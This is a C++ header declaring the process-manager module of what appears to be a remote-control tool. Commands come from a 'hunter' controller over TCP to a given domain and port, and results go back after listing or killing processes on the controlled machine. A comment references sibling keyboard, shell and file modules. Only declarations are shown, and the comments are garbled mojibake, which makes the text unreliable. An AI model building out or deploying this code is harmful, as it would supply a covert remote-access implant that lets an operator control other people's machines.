// ���̹���ģ���ʵ��
// ���ɲ�ȡ����ģʽ

#pragma once
#include "TcpSocket.h"
#include "ToolHelp.h"
#include <string>
#include <map>
#include <vector>
#include <strsafe.h>

class Proc
{
public:
	Proc();

	// ------------------------------������̹�������--------------------------------
	// hunter������ʳ��
	std::string CmdFreshProcs;           // ˢ�½����б�
	std::string CmdKillProc;             // kill����
	// ʳ�﷢����hunter
	std::string CmdSendProc;             // ����һ��������Ϣ
	std::string CmdKillProcSuccess;      // kill���̳ɹ�
	std::string CmdKillProcFailed;       // kill����ʧ��
	// �ָ��������
	std::string CmdSplit;
	std::string CmdEnd;
	// ------------------------------������̹�������(��)--------------------------------

	// ������ں��� ��Keybd��shell����Fileģ����ʽ��� ֻ��������hunter���������
	static void startByNewThread(std::string domain, int port);
	static DWORD WINAPI procThreadProc(LPVOID args);
	static void startProc(std::string domain, int port);

	// ���������ִ��
	static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);
	static std::map<std::string, std::string> parseArgs(std::string& data);
	static void processCmd(TcpSocket* sock, std::string& cmd, std::string& data);

	// �ڽ��̹������߳�ֱ�Ӵ�������ĺ���
	static void doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args);

	// ���ͽ�����Ϣ��ں�������ȻҪ�ٿ�һ���߳��� ��Ϊ���̹������߳�ֻ���������� ��������
	static void startFreshProcsByNewThread(std::string domain, int port);
	static DWORD WINAPI freshProcsThreadProc(LPVOID args);
	static void freshProcs(std::string domain, int port);
	// kill������ں�������Ҫ��Ҫ�������ͳɹ���ʧ�ܵ���Ϣ��
	static void startKillProcByNewThread(std::string domain, int port, int pid);
	static DWORD WINAPI killProcThreadProc(LPVOID args);
	static void killProc(std::string domain, int port, int pid);
};

